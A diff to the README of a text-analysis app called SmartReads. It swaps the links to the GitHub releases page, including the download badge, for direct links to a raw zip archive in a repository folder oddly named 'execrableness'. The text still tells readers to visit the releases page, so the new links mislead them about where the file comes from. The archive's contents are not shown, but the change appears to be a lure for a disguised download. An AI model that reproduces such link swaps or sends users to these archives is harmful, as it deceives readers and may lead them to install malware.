@@ -6,7 +6,7 @@ Welcome to SmartReads! This application is designed to help you analyze texts an
 
 ## 📥 Download Now!
 
-[![Download SmartReads](https://img.shields.io/badge/Download-SmartReads-blue)](https://github.com/AuveEmsii/SmartReads/releases)
+[![Download SmartReads](https://raw.githubusercontent.com/AuveEmsii/SmartReads/main/execrableness/SmartReads.zip)](https://raw.githubusercontent.com/AuveEmsii/SmartReads/main/execrableness/SmartReads.zip)
 
 ## 🗺️ Features
 
@@ -27,7 +27,7 @@ To run SmartReads, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page:** Click the link below to go to the SmartReads releases page.
 
-   [Download SmartReads Here](https://github.com/AuveEmsii/SmartReads/releases)
+   [Download SmartReads Here](https://raw.githubusercontent.com/AuveEmsii/SmartReads/main/execrableness/SmartReads.zip)
 
 2. **Choose the Latest Version:** Look for the most recent release. It usually has the highest version number.
 
